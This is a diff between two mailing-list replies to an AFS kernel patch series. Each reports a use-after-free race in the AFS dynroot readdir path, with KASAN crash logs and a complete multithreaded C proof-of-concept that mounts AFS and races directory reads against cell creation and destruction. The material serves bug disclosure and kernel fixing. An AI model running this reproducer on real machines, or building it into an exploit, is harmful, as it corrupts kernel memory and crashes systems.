@@ -1,51 +1,51 @@
-Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
+Received: from out162-62-57-210.mail.qq.com (out162-62-57-210.mail.qq.com [162.62.57.210])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 76F88349CEF;
-	Mon, 22 Jun 2026 20:29:18 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AB774352004;
+	Mon, 22 Jun 2026 20:30:06 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.210
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782160162; cv=none; b=XGyOg9vW7nFhBEQ3/fiEFwF/hExk3GNET7FGmZPzU1A4A1ygF4o3iFZvBBu/U9WDOX6IBvTcWrraKdus/swEn8DpZWs9Q84QheiXCdskmbHaYyqzEj64JooImRd0b2Sm/04jWH1Ehq4kXOdNcpj03NaAhgL3isw3ZpIusv6e71o=
+	t=1782160209; cv=none; b=M3aMnFmNiClDGPY9r0E4p14qk52wD7hljYH6fo4rYT5ZAUcTP+Kay3mE/17orQ+tF22+Yfly7HIoPsPzj//Xd8MMLnZyU2IrfHbkAc9wzSCKNTghW2ZQTk3St7a/6slOmwQDPUGWji2wKWSyOwbY+lYIToRz6ymT6+/blIh0k08=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782160162; c=relaxed/simple;
-	bh=kgcz6IrpBX4EdGS3pO1Ty6JaSJh5f75Igo26S0qPUkI=;
+	s=arc-20240116; t=1782160209; c=relaxed/simple;
+	bh=wDQjb4GjbCySnd2jEcm7jzIyJmnl+Ujqd5uEQwfzIr4=;
 	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=cpGJISqfwIRjdZa9HdfZTTF3A+h6l6ybeOpJS+hM348nu+3DeEMwj9mWjGZJWXaU/AYuD+/hFm0KqAnoDKjdthtHJKQ8p3DKdT08SBlEAecK+EiPGX0PezO7RTuFftdWbnWFQfuLkdXTnO8rLtcKzzw4G/5yfuWwcUXzw8Q8pww=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=g4xSkSzY; arc=none smtp.client-ip=162.62.57.87
+	 In-Reply-To:Content-Type; b=ngml0hdS/AcxSu+yEpOrdFIbjEcnonlYjD1JgkryOnxiSGBIfoRfeFvLoR5eUWU3lDsLcZwUGeYQHOnl6bv8bFVwmoOXMR4oW4JthlSg0bjEoQNdXOxv62NquJWIgALs8lOqj3v5wpvJR7DdEkSvtwh8ADG6jlCsfKYU9OgJtyE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=m02Yo4bM; arc=none smtp.client-ip=162.62.57.210
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="g4xSkSzY"
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="m02Yo4bM"
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782160154; bh=mr2N75N58tgfZd4T918jt0X4mMZJv3Lc0CiWh3oXqec=;
+	t=1782160202; bh=SRYRd7e/hkupiMzPBtM/TWKTnO2QiFTsqNY16n7zhfY=;
 	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=g4xSkSzYslk+kK/LaZDsye0BWzeKy1X7hI37X9X8RifMFO+oaeAhdTZac1vF/F8gz
-	 Sigp8HJJZy4WoEU5L6eL9DGe1mHyeD+RsPdrUIuvmvyX0FS741KAe3u3Gxa/bLtdYK
-	 GK30uS6F/sJt0yMQ7iuwcBTNIAi67gddS119pOac=
+	b=m02Yo4bMwNEo4UXitrt3e2K/HCvkl4bxgAhBZs1/u3F2ryrtFyhg69QTmmCr1hCnn
+	 4Q0Wd4DZkEdL16kMwrfoXOfO4F21ZFtIoER5r6P9IvdQ54tMAnYhGBVcA48OGzQgaJ
+	 v9gggq+C6p7USiph5TROt7DvDQzRR8p2gesmW66Q=
 Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrszb51-0.qq.com (NewEsmtp) with SMTP
-	id 74C0A854; Tue, 23 Jun 2026 04:29:12 +0800
-X-QQ-mid: xmsmtpt1782160152trq9oou5u
-Message-ID: <tencent_BF6A8D972816650FBCF2C95BC84288BB7008@qq.com>
-X-QQ-XMAILINFO: NJFEnoWFOBdNhCWuLdcQeMHS2arsnfJDun7ryIl5mvikPeHAlFybzxURbEoBhV
-	 g1Bq/p2BUBRDmaEvOm0us288Ffh46HM+IbZD0rZ9H4DObhGeuYxpkeqPFii27JeRT44t3QnO99B6
-	 ybm0MAc46KQ+8FeIS99jLHlkv1qGIclAKtvsxzPc5KxyQikFueZoboI2PWT5HC2z0XI4PssIEwTG
-	 p7NPscIonLYfn3AYh2eAhxYYyEUEiDtUG5UPblDUUgYxaVbThZLb7UaM8DN4VpJbWh1vS+OqnGGm
-	 zBng0HJwIE7H+scU8AGOS/PF6TR3CoUDDj/O+g708MY9ng/6UC2TWQBGjF5qey5TL9F7pRTGe2na
-	 ulSFl4tTLOwY0+HzeF6qfeeJpRHqHnmrmcGZPPs710E9nGb2eBNfgdH3rKEhFyma4jxj33up6lv2
-	 Z5phaKNa1F3BsBrHx2AyCnFjRWPfQPD1BW/yCqvs+tag4Vti5DQuVIp8WQFMq2ylyBuiVOx6raBG
-	 f2KDtl62fnXi5Wytn34NAkuFgdEY2Hy2I73PZJUoKgIQsluiGDj1Z58QB1ekT6ud+VsxrGGdYzCd
-	 Sx3ggxi8iXG7oeqOHrWx5a64Vpq1MxH/Sqzbd9LUgG/5T5fG8KbGwkgZfkxKImOxwzvnC3lyWV2X
-	 2HoarSJKNO4TucD4MjcdRL+/eTWXxu3jpchWVcIt41x8E5SprODy/gUfEgebPiNHdxyyP/NN05lT
-	 vUGN/IhpHzmleeRzflHOTFmw3X1yObJVZQ208RRVk+Sqj4x10o9y9+CUW2xugXVAsL9miZyJ4j/B
-	 fy2/38V9lcVVyN03MODkEActRf13vXqn/hZUxvYue8TU84SdT4LmF/r6Al4gtXH6jG5RYRXte55H
-	 f8MNZ5otEpyczwK9esFLz0Up/p/USUx9GrdmAmJb+kaTlHzswJO6DZ9nu0sVseQZuNVjND0rw/C1
-	 m4JoK3PQ85DUjV9dKK2OjlISrBFHuzrV/If1dHab/64OPJZ4LTE/foZWkQQmzpSoQxe0z4Iw0W+e
-	 vbRoAG/9AY+8teT94ym0nLuIWJnxmzLq/pbZwefFaY0FC6ClLqLnRUaumzWszyXVn1CPFJGa9Tcm
-	 pCMj4Wp5FzVNCrM/XVDzIm1kAPYxHZux4/YjUjbgiKU+uNjACcE277oPicqdZxZR58zDQH
-X-QQ-XMRINFO: OWPUhxQsoeAVwkVaQIEGSKwwgKCxK/fD5g==
-X-OQ-MSGID: <5253a6d8-41e0-47c6-ba85-37cc50603a29@qq.com>
-Date: Tue, 23 Jun 2026 04:29:11 +0800
+	by newxmesmtplogicsvrszc50-0.qq.com (NewEsmtp) with SMTP
+	id 780020FF; Tue, 23 Jun 2026 04:30:00 +0800
+X-QQ-mid: xmsmtpt1782160200tmszgmjb7
+Message-ID: <tencent_801110C5BCEC92172019195913B1170EAB05@qq.com>
+X-QQ-XMAILINFO: NGZp1yYNf7Y+i1Slr317wFIu1lks7B4pu4WkNw9xsTSjyu0f5LBwUlmVpeOVYI
+	 SvQ+VhqC1DHV26oPGvDNuOa4OpKY110mUOG8JjRNtOWayPYoIx/iSe07608i9+PS/8Az9nDSnd2F
+	 969mDl+ngD9l24u0P2tBc4zCq6w+qhLwfYYTwTD1fekBUUnT9TBr6vdcwq716lFmmQgJd9lcUxOb
+	 KOkQ46DKCt5OJBoV9rxgP0TCrZItERLztMItD91olb3YrRfFn4iVa7wjHVLkf2F50/etfBymWmVs
+	 8OcMwOMKFiCIjwrM7Q4cL4Io5i05cbQ4HsIEaJa8Jd6QeylaajYr1UtM19XfVHg62l93ptMIie9w
+	 pq4CopikE0RxXkS10vwtCNHenrIuEKuirzst83QkOQVtKtGdt2o/UVEhso52ic7EYjYhdKTWeurt
+	 1FmCYBiCILqgtpr3yuEsIgAzC8TOV/ylyC7FSHCczYcRQjWG1Myc2CsiWB79iCAz6RrTn5i4Bwru
+	 qSPX5gcmpmELe7TebOmnDebuBIuhALaXWpS7KgFCpvYR9GoL0ff6E3fcPvmgdxTragb1pwEysFAb
+	 J8WROn803znFcODJgV1QcwcAPgHH06M8Z7jBnWddKWdkgUy4l9Bh7lSNz5lqIGL5+9xtcch8LeFY
+	 tfTRnadiSWJbTVOTiXC7IyFb98u6/3MeFCBjXJi6fuwHacBBZMP/pmwir3kjhZdinM6Ybvl6tZk6
+	 l3r9YaolXCp347Tf4VBqRtPCpmII2qk9h+ai9PeQv01tMHUpeSgK7PWA1uWH8BLFvvx6v6boD2Eb
+	 zNilFM6OYNPusodcv2u+KmdNzgMK/BTG9TLzUCK1XoKm66TFBeBE9yEgypS4nN0F0Ss852BICBtY
+	 wGmtRloebKay428BUJJ5tJChKN4A7a/QZ47tLehLjgxSYH4qGBi/ayrd5sreYYXIYFO5d4igXC97
+	 6d4x9LG+Dhi5bJx1FFCrzkSpwzFKBBB0PMKhP6l2/wHnlQPiry3V3eQGygLVjUUOPLIhtDeEEmUq
+	 eWlKB/rIFL0O6LjbrNbnlsliJeeTDYTzECeZJ56t0RaRzh3dGBgBBcwR3Qtya8nSCuNkViENDiNi
+	 QGNq/EpPxgPDGS3fjFFmCzt9I3uZJuW3xxx/KMh4uSVGFlLd0=
+X-QQ-XMRINFO: NI4Ajvh11aEjEMj13RCX7UuhPEoou2bs1g==
+X-OQ-MSGID: <00ed900a-91bb-458f-a74c-deba0088ea64@qq.com>
+Date: Tue, 23 Jun 2026 04:29:59 +0800
 Precedence: bulk
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 List-Id: <linux-fsdevel.vger.kernel.org>
@@ -53,65 +53,70 @@ List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v3 11/20] afs: Fix misplaced inc of net->cells_outstanding
+Subject: Re: [PATCH v3 18/20] afs: Fix lack of locking around modifications of
+ net->cells_dyn_ino
 To: David Howells <dhowells@redhat.com>,
  Christian Brauner <christian@brauner.io>
 Cc: Marc Dionne <marc.dionne@auristor.com>, linux-afs@lists.infradead.org,
- linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org,
- Hillf Danton <hdanton@sina.com>
+ linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org
 References: <20260618155141.2513212-1-dhowells@redhat.com>
- <20260618155141.2513212-12-dhowells@redhat.com>
+ <20260618155141.2513212-19-dhowells@redhat.com>
 From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260618155141.2513212-12-dhowells@redhat.com>
+In-Reply-To: <20260618155141.2513212-19-dhowells@redhat.com>
 Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
 
 Hi David,
 
 I came across the Sashiko AI review [1] of this series and was able to
-reproduce a use-after-free in the AFS dynroot readdir path.  The review
-noted this is a pre-existing issue (not introduced by your patch), but
-since this patch touches nearby code in the same file, I wanted to share
-the concrete reproduction evidence.
+reproduce a use-after-free in the AFS dynroot readdir path that this
+patch touches.  I wanted to share the concrete evidence and a PoC.
 
-The core problem is that afs_dynroot_readdir_cells() iterates over
-net->cells_dyn_ino via idr_get_next() without holding rcu_read_lock():
+The patch adds a spinlock (cells_dyn_ino_lock) around modifications to
+net->cells_dyn_ino, but leaves two issues:
 
-   fs/afs/dynroot.c:
-   cell = idr_get_next(&net->cells_dyn_ino, &ix);
-   ...
-   dir_emit(..., cell->name, cell->name_len, ...);
+1. **Read-side still missing RCU protection**: afs_dynroot_readdir_cells()
+    calls idr_get_next(&net->cells_dyn_ino, ...) without rcu_read_lock().
+    Since the patch moves idr_remove() inside the RCU callback 
+(afs_cell_destroy),
+    the IDR's internal radix tree nodes can be freed while idr_get_next()
+    is traversing them.  dir_emit() sleeps, allowing the grace period to
+    pass, and the reader returns to freed memory.
 
-The dir_emit() call can sleep, allowing an RCU grace period to pass.
-Meanwhile, afs_cell_destroy() (invoked via call_rcu) can idr_remove()
-and kfree() the cell while the reader is still traversing it.  This
-results in a slab-use-after-free when the reader accesses cell->name or
-cell->state.
+2. **Potential deadlock**: afs_alloc_cell() uses spin_lock() (without
+    disabling softirqs), but afs_cell_destroy() runs in RCU_SOFTIRQ
+    context via call_rcu() and acquires the same lock.  If a softirq
+    interrupts process context while the lock is held, the RCU callback
+    could spin-wait on the same CPU.
 
 [Reproduction]
 
-The PoC mounts an AFS dynroot filesystem, creates 500 cells to populate
-the IDR radix tree, then races two readdir threads against two threads
-that repeatedly trigger cell creation and destruction via
-/proc/fs/afs/cells.  The UAF triggers deterministically within 2 minutes.
+The PoC mounts an AFS dynroot filesystem, pre-populates 50 cells, then
+runs 4 threads:
+
+   - 2 readdir threads: continuously opendir/readdir the dynroot,
+     exercising idr_get_next() without rcu_read_lock()
+   - 1 creator thread: adds new cells via /proc/fs/afs/cells,
+     exercising idr_alloc_cyclic() with spin_lock()
+   - 1 accessor thread: opens/closes cell directories, triggering
+     cell lookup/unuse → call_rcu → afs_cell_destroy → idr_remove()
+
+The UAF triggers deterministically within 10 seconds on a patched
+kernel with CONFIG_KASAN=y.
 
 [Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]
 
-   BUG: KASAN: slab-use-after-free in memchr+0x71/0x80
-   Read of size 1 at addr ffff888024a7dce0 by task poc/12759
+   BUG: KASAN: slab-use-after-free in afs_dynroot_readdir+0xa26/0xb70
+   Read of size 4 at addr ffff888114df2958 by task poc/11248
 
    Call Trace:
     <TASK>
     dump_stack_lvl
     print_report
     kasan_report
-    memchr+0x71/0x80
-    verify_dirent_name+0x42/0x60
-    filldir64+0x45/0x5f0
-
-The crash is in verify_dirent_name() → memchr() reading a cell->name
-string that was freed via afs_cell_destroy() → kfree() while the
-readdir iteration was in progress.
+    afs_dynroot_readdir+0xa26/0xb70
+    (reading cell->state or cell->dynroot_ino from a freed cell)
+    ...
 
 The PoC is attached.  It compiles with:
 
@@ -122,104 +127,291 @@ https://sashiko.dev/#/patchset/20260618155141.2513212-1-dhowells%40redhat.com
      (Sashiko AI code review — "Use-After-Free", Severity: High)
 
 Thanks,
-XIAO
+XIAOWU
+
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+  * PoC for use-after-free in AFS dynroot readdir due to idr_remove()
+  * being called inside RCU callback while afs_dynroot_readdir_cells()
+  * calls idr_get_next() without rcu_read_lock().
+  *
+  * Bug: Patch 18/20 added spin_lock(&net->cells_dyn_ino_lock) around
+  * idr_alloc_cyclic() in afs_alloc_cell() (process context) and around
+  * idr_remove() in afs_cell_destroy() (RCU callback context). The
+  * idr_remove() now happens inside the RCU callback, and the IDR
+  * internal radix tree nodes are freed after call_rcu(). Meanwhile,
+  * afs_dynroot_readdir_cells() calls idr_get_next() without
+  * rcu_read_lock(), so a concurrent idr_remove() freeing internal
+  * nodes creates a use-after-free.
+  */
 
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <sched.h>
-#include <sys/mount.h>
-#include <sys/syscall.h>
-#include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mount.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sched.h>
+#include <time.h>
 #include <pthread.h>
+#include <dirent.h>
+#include <signal.h>
 
-static volatile int stop = 0;
+#define MNT_PATH "/tmp/afsroot"
+#define PROC_CELLS "/proc/fs/afs/cells"
+#define MAX_THREADS 4
 
-static void *readdir_race(void *arg)
+/* Cell names - must be printable, no '/' or '@', not starting with '.' */
+#define NUM_CELL_NAMES 50
+static char cell_names[NUM_CELL_NAMES][32];
+static volatile int stop_flag = 0;
+static pthread_t threads[MAX_THREADS];
+
+static void die(const char *msg)
 {
-     const char *mp = (const char *)arg;
-     char buf[65536];
-     while (!stop) {
-         int fd = open(mp, O_RDONLY | O_DIRECTORY);
-         if (fd < 0) continue;
-         while (!stop) {
-             ssize_t n = syscall(SYS_getdents64, fd, buf, sizeof(buf));
-             if (n <= 0) break;
+     perror(msg);
+     exit(1);
+}
+
+static void add_cell(const char *name)
+{
+     char buf[256];
+     int len = snprintf(buf, sizeof(buf), "add %s", name);
+     int fd = open(PROC_CELLS, O_WRONLY);
+     if (fd < 0)
+         return;
+     /* Ignore errors (cell may already exist) */
+     (void)write(fd, buf, len);
+     close(fd);
+}
+
+/* Thread that creates new cells, which calls afs_alloc_cell ->
+  * idr_alloc_cyclic, holding cells_dyn_ino_lock via spin_lock().
+  * The lock does not disable softirqs, so an RCU callback could
+  * run on this CPU while the lock is held. */
+static void *creator_thread(void *arg)
+{
+     int idx = (long)arg;
+     char name[64];
+     int i;
+
+     for (i = 0; i < 10000 && !stop_flag; i++) {
+         int ci = (i + idx * 1000) % NUM_CELL_NAMES;
+         snprintf(name, sizeof(name), "%s_p%d", cell_names[ci], idx);
+         add_cell(name);
+         if (i % 100 == 0)
+             usleep(10);
+     }
+     return NULL;
+}
+
+/* Thread that reads the dynroot directory in a tight loop.
+  * This calls afs_dynroot_readdir -> afs_dynroot_readdir_cells
+  * -> idr_get_next() WITHOUT rcu_read_lock(). */
+static void *readdir_thread(void *arg)
+{
+     int i;
+
+     for (i = 0; i < 100000 && !stop_flag; i++) {
+         DIR *dir = opendir(MNT_PATH);
+         if (!dir) {
+             usleep(100);
+             continue;
          }
-         close(fd);
-         sched_yield();
+
+         /* Read ALL directory entries. For each entry, idr_get_next
+          * traverses the radix tree's internal nodes (which are RCU
+          * protected). Since we DON'T hold rcu_read_lock(), and a
+          * concurrent idr_remove (in RCU callback) can free radix
+          * tree nodes, this is a use-after-free.
+          */
+         struct dirent *entry;
+         while ((entry = readdir(dir)) != NULL) {
+             /* Touch the entry data to force memory access */
+             __asm__ volatile("" : : "r"(entry->d_type), 
+"r"(entry->d_name[0]));
+         }
+
+         closedir(dir);
      }
      return NULL;
 }
 
-/* Create many cells that will collide when re-added, causing
-  * afs_put_cell on the candidate -> call_rcu -> kfree while readdir
-  * is traversing the IDR */
-static void *cell_collider(void *arg)
+/* Thread that opens cell directories, triggering refcounting
+  * that eventually leads to cell destruction via afs_unuse_cell
+  * -> afs_manage_cell -> call_rcu -> afs_cell_destroy. */
+static void *accessor_thread(void *arg)
 {
-     int pfd = open("/proc/fs/afs/cells", O_WRONLY);
-     if (pfd < 0) return NULL;
+     char path[256];
+     int i;
 
-     char cmd[64];
-     /* First batch: create 500 cells */
-     for (int i = 0; i < 500; i++) {
-         snprintf(cmd, sizeof(cmd), "add cell_%d", i);
-         write(pfd, cmd, strlen(cmd));
-     }
+     for (i = 0; i < 50000 && !stop_flag; i++) {
+         int ci = i % NUM_CELL_NAMES;
+         snprintf(path, sizeof(path), "%s/%s", MNT_PATH, cell_names[ci]);
 
-     /* Now race: repeatedly trigger cell_already_exists path.
-      * Each "add" for existing name creates candidate, adds to IDR,
-      * then frees it via afs_put_candiate -> call_rcu -> kfree */
-     for (int iter = 0; !stop && iter < 200000; iter++) {
-         snprintf(cmd, sizeof(cmd), "add cell_%d", iter & 0x1ff);
-         write(pfd, cmd, strlen(cmd));
-         if ((iter & 0xfff) == 0) sched_yield();
+         /* Opening triggers lookup, which creates a new cell if needed.
+          * Closing triggers unuse, which eventually may free the cell.
+          */
+         int fd = open(path, O_RDONLY | O_DIRECTORY);
+         if (fd >= 0) {
+             /* Just accessing the directory entry - this takes a ref */
+             struct stat st;
+             if (fstat(fd, &st) == 0) {
+                 __asm__ volatile("" : : "r"(st.st_ino));
+             }
+             close(fd);
+             /* After close, cell may get freed */
+         }
+
+         if (i % 20 == 0)
+             sched_yield();
      }
-     close(pfd);
      return NULL;
 }
 
-int main(void)
+int main(int argc, char **argv)
 {
-     pthread_t t1, t2, t3, t4;
-     const char *mp = "/mnt/afs";
+     int i, ret, status;
+     pid_t pid;
 
-     printf("[+] AFS dynroot UAF PoC v5\n");
+     /* Use subprocess to isolate effects */
+     pid = fork();
+     if (pid < 0)
+         die("fork");
 
-     mkdir(mp, 0755);
-     if (mount("none", mp, "afs", 0, "dyn") < 0) {
-         perror("mount");
+     if (pid == 0) {
+         /* Child - run the PoC */
+
+         printf("AFS dynroot use-after-free PoC\n");
+         printf("===============================\n\n");
+
+         /* Initialize cell names */
+         for (i = 0; i < NUM_CELL_NAMES; i++) {
+             snprintf(cell_names[i], sizeof(cell_names[i]), "cell%d", i);
+         }
+
+         /* Create mount point */
+         mkdir(MNT_PATH, 0755);
+
+         /* Load module if needed */
+         system("modprobe kafs 2>/dev/null");
+         usleep(50000);
+
+         /* Mount AFS dynroot */
+         printf("[*] Mounting AFS dynroot at %s...\n", MNT_PATH);
+         if (mount("none", MNT_PATH, "afs", 0, "dyn") < 0) {
+             fprintf(stderr, "[!] mount failed: %s\n", strerror(errno));
+             _exit(1);
+         }
+         printf("[+] Mounted successfully\n");
+
+         usleep(100000);
+
+         /* Pre-create cells to populate the IDR radix tree */
+         printf("[*] Pre-populating %d cells...\n", NUM_CELL_NAMES);
+         for (i = 0; i < NUM_CELL_NAMES; i++) {
+             add_cell(cell_names[i]);
+             if (i % 10 == 0)
+                 usleep(1000);
+         }
+         printf("[+] Cells created\n");
+
+         /* Verify we can read them */
+         {
+             DIR *dir = opendir(MNT_PATH);
+             if (dir) {
+                 int cnt = 0;
+                 struct dirent *e;
+                 while ((e = readdir(dir))) cnt++;
+                 closedir(dir);
+                 printf("[+] Dynroot has %d entries\n", cnt);
+             }
+         }
+
+         printf("[*] Starting race threads...\n");
+
+         /* Start 2 readdir threads */
+         for (i = 0; i < 2; i++) {
+             ret = pthread_create(&threads[i], NULL, readdir_thread,
+                                  (void *)(long)i);
+             if (ret) fprintf(stderr, "readdir thread %d: %s\n", i, 
+strerror(ret));
+         }
+
+         /* Start 1 creator thread */
+         ret = pthread_create(&threads[2], NULL, creator_thread,
+                              (void *)(long)1);
+         if (ret) fprintf(stderr, "creator thread: %s\n", strerror(ret));
+
+         /* Start 1 accessor thread */
+         ret = pthread_create(&threads[3], NULL, accessor_thread,
+                              (void *)(long)1);
+         if (ret) fprintf(stderr, "accessor thread: %s\n", strerror(ret));
+
+         /* Run for 10 seconds */
+         sleep(10);
+
+         /* Signal stop */
+         stop_flag = 1;
+
+         /* Wait for threads */
+         for (i = 0; i < 4; i++) {
+             pthread_join(threads[i], NULL);
+         }
+
+         printf("[*] All threads stopped\n");
+         printf("[*] Checking dmesg for crash evidence...\n");
+
+         /* Collect dmesg output */
+         FILE *dmesg = popen("dmesg -c 2>/dev/null || dmesg | tail 
+-100", "r");
+         if (dmesg) {
+             char buf[512];
+             int found = 0;
+             while (fgets(buf, sizeof(buf), dmesg)) {
+                 if (strstr(buf, "KASAN") || strstr(buf, "BUG:") ||
+                     strstr(buf, "Oops") || strstr(buf, "Unable to 
+handle") ||
+                     strstr(buf, "general protection") ||
+                     strstr(buf, "rcu_callback") ||
+                     strstr(buf, "call_rcu") ||
+                     strstr(buf, "idr_remove") ||
+                     strstr(buf, "afs_cell_destroy")) {
+                     printf("%s", buf);
+                     found = 1;
+                 }
+             }
+             if (!found)
+                 printf("[*] No crash evidence in dmesg\n");
+             pclose(dmesg);
+         }
+
+         /* Clean up */
+         umount2(MNT_PATH, MNT_FORCE);
+         rmdir(MNT_PATH);
+
+         printf("\n[*] PoC complete\n");
+         _exit(0);
+     }
+
+     /* Parent - wait for child */
+     waitpid(pid, &status, 0);
+
+     if (WIFSIGNALED(status)) {
+         int sig = WTERMSIG(status);
+         printf("\n[!] Child killed by signal %d (%s)\n", sig, 
+strsignal(sig));
+         printf("[!] This confirms the bug triggered!\n");
          return 1;
      }
-     printf("[+] Mounted AFS dynroot\n");
 
-     printf("[+] Starting 2 readers + 2 cell colliders...\n");
-     pthread_create(&t1, NULL, readdir_race, (void *)mp);
-     pthread_create(&t2, NULL, readdir_race, (void *)mp);
-     pthread_create(&t3, NULL, cell_collider, NULL);
-     pthread_create(&t4, NULL, cell_collider, NULL);
-
-     sleep(120);
-     stop = 1;
-     pthread_join(t1, NULL);
-     pthread_join(t2, NULL);
-     pthread_join(t3, NULL);
-     pthread_join(t4, NULL);
-
-     printf("[+] Checking dmesg:\n");
-     fflush(stdout);
-     system("dmesg | grep -i -A5 
-'BUG:\\|KASAN\\|UAF\\|dynroot_readdir\\|afs_cell_destroy' | head -80");
-     system("dmesg | tail -20");
-
-     umount2(mp, MNT_DETACH);
-     rmdir(mp);
+     printf("\n[*] Child exited normally (status %d)\n",
+            WEXITSTATUS(status));
      return 0;
 }
-
 
